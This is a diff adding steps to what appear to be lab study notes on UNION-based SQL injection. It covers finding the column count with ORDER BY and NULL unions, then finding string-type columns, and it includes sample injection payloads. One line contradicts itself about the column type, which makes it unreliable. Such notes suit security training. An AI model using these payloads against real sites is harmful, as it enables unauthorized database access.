@@ -24,6 +24,7 @@ Rule:
 - The number and the order of the columns must be teh same in all the queries .
 - The data types must be compatible.
 
+Step #1: Determine # of columns
 
 SQLi attack (way #1): 
 
@@ -36,3 +37,23 @@ select ? from table1 UNION select NULL, NULL, Null
 SQLi attack (way #2):
 
 select a,b from table1 order by {give a number of column here }
+
+Step #2: Determine the data type of the  columns
+
+select a, b, c from table1 UNION select 'a', NULL , NULL
+
+-> error -> column is not type string
+-> no error -> column is not type text
+
+
+Analysis : 
+
+'order by 1 --
+-> 3 columns -> st column is not showing on the page {index column}
+
+' UNION select null,'UyDcX3',NULL--
+-> 2nd column is string type 
+
+
+
+script.py <url>
